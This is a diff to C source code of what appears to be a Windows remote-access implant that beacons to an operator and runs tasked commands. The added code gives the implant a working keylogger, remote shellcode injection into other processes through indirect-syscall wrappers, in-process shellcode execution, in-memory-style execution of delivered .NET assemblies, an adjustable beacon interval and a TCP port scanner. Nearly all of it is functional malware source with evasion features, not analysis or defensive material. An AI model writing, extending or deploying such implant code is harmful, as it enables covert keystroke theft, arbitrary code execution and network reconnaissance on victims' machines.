@@ -2521,6 +2521,48 @@ typedef struct {
 
 static _LT_SLOT _lt_slots[LT_MAX_CONCURRENT];
 
+/* Dynamic sleep interval — operator-controlled via "sleep <ms>" command.
+ * Default: midpoint of the compile-time jitter range. */
+static volatile DWORD _lt_sleep_base_ms = LT_C2_JITTER_MIN + (LT_C2_JITTER_MAX - LT_C2_JITTER_MIN) / 2;
+
+/* ── Keylogger state ─────────────────────────────────────────────────────── */
+#define LT_KLOG_CAP 65536
+static volatile LONG  _lt_klog_run    = 0;  /* 1 = running */
+static volatile DWORD _lt_klog_used   = 0;
+static char          *_lt_klog_buf    = NULL;
+static HANDLE         _lt_klog_thread = NULL;
+
+static const char _lt_vk_map[256] = {
+    0,0,0,0,0,0,0,0,'\b','\t',0,0,0,'\n',0,0,  /* 0x00-0x0F */
+    0,0,0,0,0,0,0,0,0,0,0,27,0,0,0,0,           /* 0x10-0x1F */
+    ' ',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,          /* 0x20-0x2F */
+    '0','1','2','3','4','5','6','7','8','9',      /* 0x30-0x39 */
+    0,0,0,0,0,0,0,
+    'a','b','c','d','e','f','g','h','i','j','k','l','m', /* 0x41-0x4D */
+    'n','o','p','q','r','s','t','u','v','w','x','y','z', /* 0x4E-0x5A */
+};
+
+static DWORD WINAPI _lt_klog_thread_fn(PVOID p) {
+    (void)p;
+    SHORT prev[256]={0};
+    while(InterlockedCompareExchange(&_lt_klog_run,1,1)==1){
+        for(int vk=0x08;vk<=0x5A;vk++){
+            SHORT st=GetAsyncKeyState(vk);
+            if((st&1)&&!(prev[vk]&1)&&_lt_klog_buf&&_lt_klog_used<LT_KLOG_CAP-4){
+                char c=_lt_vk_map[vk];
+                if(c){
+                    if(c=='\b'&&_lt_klog_used>0){_lt_klog_used--;} /* backspace */
+                    else if(c=='\n'){_lt_klog_buf[_lt_klog_used++]='\\';_lt_klog_buf[_lt_klog_used++]='n';}
+                    else _lt_klog_buf[_lt_klog_used++]=c;
+                }
+            }
+            prev[vk]=st;
+        }
+        Sleep(10);
+    }
+    return 0;
+}
+
 static DWORD WINAPI POLY_TASK_THREAD(PVOID param) {
     _LT_SLOT *sl = (_LT_SLOT*)param;
     /* delegate execution — POLY_EXECMD tries direct path first (Task 1) */
@@ -3167,7 +3209,7 @@ static void POLY_AGENT(void) {
         if(_any_active)
             POLY_NTDELAY(500LL*10000LL);
         else
-            POLY_NTDELAY((LONGLONG)lt_jitter_ms(LT_C2_JITTER_MIN+(LT_C2_JITTER_MAX-LT_C2_JITTER_MIN)/2)*10000LL);
+            POLY_NTDELAY((LONGLONG)lt_jitter_ms(_lt_sleep_base_ms)*10000LL);
 
         /* ── Harvest completed slots and POST results ── */
         for(int _si=0;_si<LT_MAX_CONCURRENT;_si++){
@@ -3713,6 +3755,64 @@ static void POLY_AGENT(void) {
             if(output) HeapFree(GetProcessHeap(),0,output);
             HeapFree(GetProcessHeap(),0,task_raw); continue;
 
+        /* keylog start|stop|dump — in-process keystroke capture */
+        } else if(lt_strpfx(command,"keylog")&&(command[6]==0||command[6]==' ')){
+            const char *karg=(command[6]==' '&&command[7])?command+7:"dump";
+            const char *kout=NULL;
+            char kdump[LT_KLOG_CAP+64];
+            if(lt_strpfx(karg,"start")){
+                if(!InterlockedCompareExchange(&_lt_klog_run,1,0)){
+                    _lt_klog_buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,LT_KLOG_CAP);
+                    _lt_klog_used=0;
+                    HANDLE ht=CreateThread(NULL,0,_lt_klog_thread_fn,NULL,0,NULL);
+                    if(ht){_lt_klog_thread=ht; kout="[+] keylog: started\r\n";}
+                    else{InterlockedExchange(&_lt_klog_run,0);kout="[-] keylog: thread failed\r\n";}
+                } else kout="[!] keylog: already running\r\n";
+            } else if(lt_strpfx(karg,"stop")){
+                if(InterlockedCompareExchange(&_lt_klog_run,0,1)){
+                    if(_lt_klog_thread){WaitForSingleObject(_lt_klog_thread,500);
+                        CloseHandle(_lt_klog_thread);_lt_klog_thread=NULL;}
+                    kout="[+] keylog: stopped\r\n";
+                } else kout="[!] keylog: not running\r\n";
+            } else { /* dump */
+                DWORD used=_lt_klog_used;
+                if(!_lt_klog_buf||used==0){kout="(empty)\r\n";}
+                else{
+                    const char *hdr="[keylog dump]\r\n";
+                    int hl=15; for(int hi=0;hdr[hi];hi++,hl=hi);
+                    hl=0; while(hdr[hl]) kdump[hl]=hdr[hl++];
+                    for(DWORD ki=0;ki<used&&ki<LT_KLOG_CAP;ki++) kdump[hl++]=_lt_klog_buf[ki];
+                    kdump[hl]=0; kout=kdump;
+                }
+            }
+            DWORD out_len=(DWORD)lt_strlen(kout);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _ki=0;_ki<out_len;_ki++) output[_ki]=(BYTE)kout[_ki];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* sleep <ms> — change beacon interval (0 = restore default) */
+        } else if(lt_strpfx(command,"sleep ")&&command[6]){
+            DWORD new_ms=0; int si2=6;
+            while(command[si2]>='0'&&command[si2]<='9'){new_ms=new_ms*10+(command[si2++]-'0');}
+            if(new_ms==0) new_ms=LT_C2_JITTER_MIN+(LT_C2_JITTER_MAX-LT_C2_JITTER_MIN)/2;
+            _lt_sleep_base_ms=new_ms;
+            char sl_msg[64]="[+] sleep: interval set to ";
+            DWORD v=new_ms; char tmp[12]={0}; int ti=0;
+            if(v==0){tmp[ti++]='0';}else{char tb[12]={0};int tb2=0;
+                while(v>0){tb[tb2++]=(char)('0'+(v%10));v/=10;}
+                for(int ri=tb2-1;ri>=0;ri--) tmp[ti++]=tb[ri];}
+            for(int ci=0;tmp[ci];ci++) sl_msg[27+ci]=tmp[ci];
+            int sllen=27+ti;
+            sl_msg[sllen++]='m'; sl_msg[sllen++]='s'; sl_msg[sllen++]='\r'; sl_msg[sllen++]='\n';
+            DWORD out_len=(DWORD)sllen;
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output) for(DWORD _sli=0;_sli<out_len;_sli++) output[_sli]=(BYTE)sl_msg[_sli];
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
         /* pwd — print working directory */
         } else if(lt_strpfx(command,"pwd")&&(command[3]==0||command[3]==' ')){
             WCHAR wp[520]={0}; GetCurrentDirectoryW(519,wp);
@@ -3798,6 +3898,339 @@ static void POLY_AGENT(void) {
             HeapFree(GetProcessHeap(),0,ls_buf);
             _lt_post_task_result(session_id,task_id,result_base,lo,ls_used);
             if(lo) HeapFree(GetProcessHeap(),0,lo);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* inject <pid> <base64> — remote shellcode injection into target PID */
+        } else if(lt_strpfx(command,"inject ")&&command[7]){
+            const char *inj_arg=command+7;
+            DWORD inj_pid=0; int inj_i=0;
+            while(inj_arg[inj_i]>='0'&&inj_arg[inj_i]<='9'){
+                inj_pid=inj_pid*10+(inj_arg[inj_i++]-'0');}
+            if(inj_pid==0||inj_arg[inj_i]!=' '||!inj_arg[inj_i+1]){
+                const char *em="[-] inject: usage: inject <pid> <base64_shellcode>\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            const char *inj_b64=inj_arg+inj_i+1;
+            DWORD inj_b64_len=(DWORD)lt_strlen(inj_b64);
+            DWORD inj_maxlen=(inj_b64_len*3)/4+8;
+            PBYTE inj_heap=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,inj_maxlen);
+            DWORD inj_sc_len=inj_heap?lt_b64dec((const BYTE*)inj_b64,inj_b64_len,inj_heap):0;
+            if(inj_sc_len<4){
+                if(inj_heap) HeapFree(GetProcessHeap(),0,inj_heap);
+                const char *em="[-] inject: shellcode decode failed\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Open target process */
+            HANDLE hInj=OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD,
+                FALSE,inj_pid);
+            if(!hInj){
+                HeapFree(GetProcessHeap(),0,inj_heap);
+                const char *em="[-] inject: OpenProcess failed — try steal_token first\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            PVOID inj_va=NULL; SIZE_T inj_sz=(SIZE_T)inj_sc_len;
+            NTSTATUS inj_st=POLY_NTALLOC(hInj,&inj_va,0,&inj_sz,
+                MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+            if(inj_st<0||!inj_va){
+                CloseHandle(hInj); HeapFree(GetProcessHeap(),0,inj_heap);
+                const char *em="[-] inject: remote alloc failed\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            POLY_NTWRITE(hInj,inj_va,inj_heap,(SIZE_T)inj_sc_len,NULL);
+            HeapFree(GetProcessHeap(),0,inj_heap);
+            ULONG inj_old=0;
+            POLY_NTPROT(hInj,&inj_va,&inj_sz,PAGE_EXECUTE_READ,&inj_old);
+            HANDLE inj_th=NULL;
+            POLY_NTTHREAD(&inj_th,THREAD_ALL_ACCESS,NULL,hInj,
+                (PVOID)inj_va,NULL,0,0,0x10000,0x10000,NULL);
+            CloseHandle(hInj);
+            char inj_resp[96]={0}; int inj_ri=0;
+            const char *inj_pfx=inj_th?"[+] inject: shellcode running in pid "
+                                       :"[-] inject: thread creation failed in pid ";
+            for(int _ip=0;inj_pfx[_ip];_ip++) inj_resp[inj_ri++]=inj_pfx[_ip];
+            char pidstr[12]={0}; lt_itoa(inj_pid,pidstr);
+            for(int _ip2=0;pidstr[_ip2];_ip2++) inj_resp[inj_ri++]=pidstr[_ip2];
+            inj_resp[inj_ri++]='\r'; inj_resp[inj_ri++]='\n';
+            if(inj_th) POLY_NTCLOSE(inj_th);
+            PBYTE inj_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,(DWORD)inj_ri+2);
+            if(inj_out) for(int _io=0;_io<inj_ri;_io++) inj_out[_io]=(BYTE)inj_resp[_io];
+            _lt_post_task_result(session_id,task_id,result_base,inj_out,(DWORD)inj_ri);
+            if(inj_out) HeapFree(GetProcessHeap(),0,inj_out);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* execasm <b64_assembly> [args] — run .NET assembly in-memory, capture stdout
+         * Decodes b64 assembly, writes to %TEMP%, runs via dotnet with pipe capture,
+         * captures stdout/stderr, deletes temp file, returns output. */
+        } else if(lt_strpfx(command,"execasm ")&&command[8]){
+            const char *ea_arg=command+8;
+            /* split: first token is b64, remainder is args */
+            int ea_b64_end=0;
+            while(ea_arg[ea_b64_end]&&ea_arg[ea_b64_end]!=' ') ea_b64_end++;
+            DWORD ea_b64_len=(DWORD)ea_b64_end;
+            DWORD ea_maxsz=(ea_b64_len*3)/4+8;
+            PBYTE ea_bytes=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ea_maxsz);
+            if(!ea_bytes){
+                const char *em="[-] execasm: alloc failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            DWORD ea_sz=lt_b64dec((const BYTE*)ea_arg,ea_b64_len,ea_bytes);
+            if(ea_sz<4){
+                HeapFree(GetProcessHeap(),0,ea_bytes);
+                const char *em="[-] execasm: decode failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Write to temp file */
+            WCHAR ea_td[512]={0},ea_tf[512]={0};
+            GetTempPathW(480,ea_td);
+            GetTempFileNameW(ea_td,L"ea",0,ea_tf);
+            /* Give it a .dll extension so dotnet recognises it */
+            WCHAR ea_dll[520]={0}; int ea_di=0;
+            while(ea_tf[ea_di]&&ea_di<515){ea_dll[ea_di]=ea_tf[ea_di];ea_di++;}
+            /* Replace last char with ".dll" */
+            if(ea_di>4){ea_di-=4; ea_dll[ea_di]=0;}
+            const WCHAR _dll[]={L'.',L'd',L'l',L'l',0};
+            for(int _di=0;_dll[_di];_di++) ea_dll[ea_di++]=_dll[_di]; ea_dll[ea_di]=0;
+            HANDLE hEaF=CreateFileW(ea_dll,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,NULL);
+            if(hEaF==INVALID_HANDLE_VALUE){
+                HeapFree(GetProcessHeap(),0,ea_bytes);
+                DeleteFileW(ea_tf);
+                const char *em="[-] execasm: temp file create failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            DWORD ea_bw=0; WriteFile(hEaF,ea_bytes,(DWORD)ea_sz,&ea_bw,NULL);
+            CloseHandle(hEaF); HeapFree(GetProcessHeap(),0,ea_bytes);
+            /* Build command: dotnet <path.dll> [args] */
+            char ea_cmd[4096]={0}; int ea_ci=0;
+            const char *ea_pfx="dotnet ";
+            for(int _p=0;ea_pfx[_p];_p++) ea_cmd[ea_ci++]=ea_pfx[_p];
+            /* append wide path as narrow */
+            for(int _wp=0;ea_dll[_wp]&&ea_ci<3900;_wp++)
+                ea_cmd[ea_ci++]=(char)(ea_dll[_wp]&0xFF);
+            if(ea_arg[ea_b64_end]==' '){
+                ea_cmd[ea_ci++]=' ';
+                const char *ea_args=ea_arg+ea_b64_end+1;
+                for(int _ap=0;ea_args[_ap]&&ea_ci<4090;_ap++) ea_cmd[ea_ci++]=ea_args[_ap];
+            }
+            ea_cmd[ea_ci]=0;
+            /* Run via POLY_EXECMD — falls back to cmd.exe which finds dotnet in PATH */
+            DWORD ea_outlen=0;
+            PBYTE ea_out=POLY_EXECMD(ea_cmd,&ea_outlen);
+            /* Cleanup temp files */
+            DeleteFileW(ea_dll); DeleteFileW(ea_tf);
+            if(!ea_out||ea_outlen==0){
+                const char *em="[-] execasm: execution failed (dotnet not found?)\r\n";
+                DWORD el=(DWORD)lt_strlen(em);
+                if(ea_out){HeapFree(GetProcessHeap(),0,ea_out);ea_out=NULL;ea_outlen=0;}
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            _lt_post_task_result(session_id,task_id,result_base,ea_out,ea_outlen);
+            HeapFree(GetProcessHeap(),0,ea_out);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* shellcode <base64> — decode and run raw shellcode in-process */
+        } else if(lt_strpfx(command,"shellcode ")&&command[10]){
+            const char *sc_b64=command+10;
+            DWORD sc_b64_len=(DWORD)lt_strlen(sc_b64);
+            DWORD sc_maxlen=(sc_b64_len*3)/4+8;
+            PBYTE sc_heap=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sc_maxlen);
+            if(!sc_heap){
+                const char *em="[-] shellcode: heap alloc failed\r\n";
+                DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            DWORD sc_len=lt_b64dec((const BYTE*)sc_b64,sc_b64_len,sc_heap);
+            if(sc_len<4){
+                HeapFree(GetProcessHeap(),0,sc_heap);
+                const char *em="[-] shellcode: base64 decode failed or too short\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Allocate RW virtual memory for shellcode via indirect syscall */
+            PVOID sc_va=NULL; SIZE_T sc_sz=(SIZE_T)sc_len;
+            NTSTATUS sst=POLY_NTALLOC(GetCurrentProcess(),&sc_va,0,&sc_sz,
+                MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+            if(sst<0||!sc_va){
+                HeapFree(GetProcessHeap(),0,sc_heap);
+                const char *em="[-] shellcode: VirtualAlloc failed\r\n";
+                DWORD el=(DWORD)lt_strlen(em); PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Copy shellcode to virtual memory and make RX */
+            POLY_NTWRITE(GetCurrentProcess(),sc_va,sc_heap,(SIZE_T)sc_len,NULL);
+            HeapFree(GetProcessHeap(),0,sc_heap);
+            ULONG sc_old_prot=0;
+            POLY_NTPROT(GetCurrentProcess(),&sc_va,&sc_sz,PAGE_EXECUTE_READ,&sc_old_prot);
+            /* Launch shellcode thread via indirect NtCreateThreadEx */
+            HANDLE sc_th=NULL;
+            POLY_NTTHREAD(&sc_th,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),
+                (PVOID)sc_va,NULL,0,0,0x10000,0x10000,NULL);
+            const char *sc_resp=sc_th?"[+] shellcode: running in background thread\r\n"
+                                     :"[-] shellcode: thread creation failed\r\n";
+            if(sc_th) POLY_NTCLOSE(sc_th);
+            DWORD sr_len=(DWORD)lt_strlen(sc_resp);
+            PBYTE sr_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,sr_len+2);
+            if(sr_out) for(DWORD _i=0;_i<=sr_len;_i++) sr_out[_i]=(BYTE)sc_resp[_i];
+            _lt_post_task_result(session_id,task_id,result_base,sr_out,sr_len);
+            if(sr_out) HeapFree(GetProcessHeap(),0,sr_out);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* portscan <host> [start[-end]] — TCP connect-based port scanner */
+        } else if(lt_strpfx(command,"portscan ")&&command[9]){
+            const char *ps_arg=command+9;
+            char ps_host[128]={0}; int phi=0;
+            while(ps_arg[phi]&&ps_arg[phi]!=' '&&phi<127){ps_host[phi]=ps_arg[phi];phi++;}
+            DWORD ps_s=1,ps_e=1024;
+            if(ps_arg[phi]==' '){
+                const char *pr=ps_arg+phi+1; DWORD pa=0; int pi=0;
+                while(pr[pi]>='0'&&pr[pi]<='9'){pa=pa*10+(pr[pi++]-'0');}
+                ps_s=pa;
+                if(pr[pi]=='-'){pi++; DWORD pb=0;
+                    while(pr[pi]>='0'&&pr[pi]<='9'){pb=pb*10+(pr[pi++]-'0');}
+                    ps_e=pb?pb:pa;
+                } else { ps_e=pa; }
+            }
+            if(ps_s==0) ps_s=1;
+            if(ps_e<ps_s) ps_e=ps_s;
+            if(ps_e-ps_s>10000) ps_e=ps_s+10000;
+            DWORD ps_cap=8192,ps_used=0;
+            char *ps_buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ps_cap);
+            if(!ps_buf){HeapFree(GetProcessHeap(),0,task_raw);continue;}
+            /* Load ws2_32 dynamically — same pattern as POLY_HTTPGET */
+            typedef int    (WINAPI *pfnWSS2)(WORD,PVOID);
+            typedef SOCKET (WINAPI *pfnSK2)(int,int,int);
+            typedef int    (WINAPI *pfnCN2)(SOCKET,const struct sockaddr*,int);
+            typedef int    (WINAPI *pfnCS2)(SOCKET);
+            typedef int    (WINAPI *pfnIO2)(SOCKET,long,u_long*);
+            typedef int    (WINAPI *pfnSL2)(int,fd_set*,fd_set*,fd_set*,const struct timeval*);
+            typedef u_short(WINAPI *pfnHN2)(u_short);
+            typedef int    (WINAPI *pfnGAI2)(const char*,const char*,_LT_AI*,_LT_AI**);
+            typedef void   (WINAPI *pfnFAI2)(_LT_AI*);
+            HMODULE hWs2=LoadLibraryA("ws2_32.dll");
+            if(!hWs2){HeapFree(GetProcessHeap(),0,ps_buf);
+                _lt_post_task_result(session_id,task_id,result_base,(PBYTE)"[-] portscan: ws2_32 load failed\r\n",34);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;}
+            pfnWSS2 fnWSS2=(pfnWSS2)GetProcAddress(hWs2,"WSAStartup");
+            pfnSK2  fnSK2 =(pfnSK2) GetProcAddress(hWs2,"socket");
+            pfnCN2  fnCN2 =(pfnCN2) GetProcAddress(hWs2,"connect");
+            pfnCS2  fnCS2 =(pfnCS2) GetProcAddress(hWs2,"closesocket");
+            pfnIO2  fnIO2 =(pfnIO2) GetProcAddress(hWs2,"ioctlsocket");
+            pfnSL2  fnSL2 =(pfnSL2) GetProcAddress(hWs2,"select");
+            pfnHN2  fnHN2 =(pfnHN2) GetProcAddress(hWs2,"htons");
+            pfnGAI2 fnGAI2=(pfnGAI2)GetProcAddress(hWs2,"getaddrinfo");
+            pfnFAI2 fnFAI2=(pfnFAI2)GetProcAddress(hWs2,"freeaddrinfo");
+            typedef int (WINAPI *pfnWSC2)(void);
+            pfnWSC2 fnWSC2=(pfnWSC2)GetProcAddress(hWs2,"WSACleanup");
+            if(!fnWSS2||!fnSK2||!fnCN2||!fnCS2||!fnIO2||!fnSL2||!fnHN2||!fnGAI2||!fnFAI2){
+                FreeLibrary(hWs2); HeapFree(GetProcessHeap(),0,ps_buf);
+                _lt_post_task_result(session_id,task_id,result_base,(PBYTE)"[-] portscan: ws2_32 proc fail\r\n",32);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;}
+            WSADATA ps_wsd; lt_zero(&ps_wsd,sizeof(ps_wsd));
+            fnWSS2(0x0202,&ps_wsd);
+            /* Resolve hostname once before scanning ports */
+            u_long ps_ip=0xFFFFFFFF;
+            { _LT_AI ps_hints; lt_zero(&ps_hints,sizeof(ps_hints));
+              ps_hints.ai_family=2; ps_hints.ai_socktype=1; /* AF_INET, SOCK_STREAM */
+              _LT_AI *ps_res=NULL;
+              if(fnGAI2(ps_host,NULL,&ps_hints,&ps_res)==0&&ps_res){
+                  ps_ip=((struct sockaddr_in*)ps_res->ai_addr)->sin_addr.S_un.S_addr;
+                  fnFAI2(ps_res);
+              }
+            }
+            if(ps_ip==0xFFFFFFFF){
+                const char *em3="[-] portscan: host resolution failed\r\n";
+                DWORD el3=(DWORD)lt_strlen(em3);
+                if(fnWSC2) fnWSC2(); FreeLibrary(hWs2);
+                HeapFree(GetProcessHeap(),0,ps_buf);
+                PBYTE eo3=(PBYTE)HeapAlloc(GetProcessHeap(),0,el3+2);
+                if(eo3) for(DWORD _i=0;_i<=el3;_i++) eo3[_i]=(BYTE)em3[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo3,el3);
+                if(eo3) HeapFree(GetProcessHeap(),0,eo3);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;}
+            DWORD ps_open=0;
+            for(DWORD port=ps_s;port<=ps_e;port++){
+                SOCKET sk=fnSK2(2,1,6);
+                if(sk==(SOCKET)(~0)) continue;
+                u_long nb2=1; fnIO2(sk,(long)0x8004667EUL,&nb2); /* FIONBIO */
+                struct sockaddr_in sa2; lt_zero(&sa2,sizeof(sa2));
+                sa2.sin_family=2; /* AF_INET */
+                sa2.sin_port=fnHN2((u_short)port);
+                sa2.sin_addr.S_un.S_addr=ps_ip;
+                fnCN2(sk,(struct sockaddr*)&sa2,(int)sizeof(sa2));
+                /* select 250ms write-ready = connected */
+                fd_set wfds; FD_ZERO(&wfds); FD_SET(sk,&wfds);
+                struct timeval tv2={0,250000};
+                int sel2=fnSL2(0,NULL,&wfds,NULL,&tv2);
+                if(sel2>0){
+                    char pln[32]={0}; int pli=0;
+                    char ptmp2[8]={0}; DWORD pv2=port; int pti2=0;
+                    if(pv2==0){ptmp2[0]='0';pti2=1;}
+                    else{char rt2[8]={0};int ri2=0;
+                        while(pv2>0){rt2[ri2++]=(char)('0'+(int)(pv2%10));pv2/=10;}
+                        for(int _rr=ri2-1;_rr>=0;_rr--) ptmp2[pti2++]=rt2[_rr];}
+                    for(int _pp=0;_pp<pti2;_pp++) pln[pli++]=ptmp2[_pp];
+                    const char *sfx="/tcp  open\r\n";
+                    for(int _ss=0;sfx[_ss];_ss++) pln[pli++]=sfx[_ss];
+                    if(ps_used+(DWORD)pli+4>ps_cap){
+                        DWORD nc2=ps_cap*2+(DWORD)pli+64;
+                        char *nb3=(char*)HeapAlloc(GetProcessHeap(),0,nc2);
+                        if(nb3){for(DWORD _ci=0;_ci<ps_used;_ci++) nb3[_ci]=ps_buf[_ci];
+                            HeapFree(GetProcessHeap(),0,ps_buf);ps_buf=nb3;ps_cap=nc2;}}
+                    for(int _aa=0;_aa<pli;_aa++) ps_buf[ps_used++]=pln[_aa];
+                    ps_open++;
+                }
+                fnCS2(sk);
+            }
+            if(fnWSC2) fnWSC2(); FreeLibrary(hWs2);
+            if(ps_used==0){const char *nem="(no open ports)\r\n";
+                for(int _ni=0;nem[_ni];_ni++) ps_buf[ps_used++]=nem[_ni];}
+            PBYTE ps_out=(PBYTE)HeapAlloc(GetProcessHeap(),0,ps_used+2);
+            if(ps_out) for(DWORD _pi=0;_pi<ps_used;_pi++) ps_out[_pi]=(BYTE)ps_buf[_pi];
+            HeapFree(GetProcessHeap(),0,ps_buf);
+            _lt_post_task_result(session_id,task_id,result_base,ps_out,ps_used);
+            if(ps_out) HeapFree(GetProcessHeap(),0,ps_out);
             HeapFree(GetProcessHeap(),0,task_raw); continue;
 
         } else {
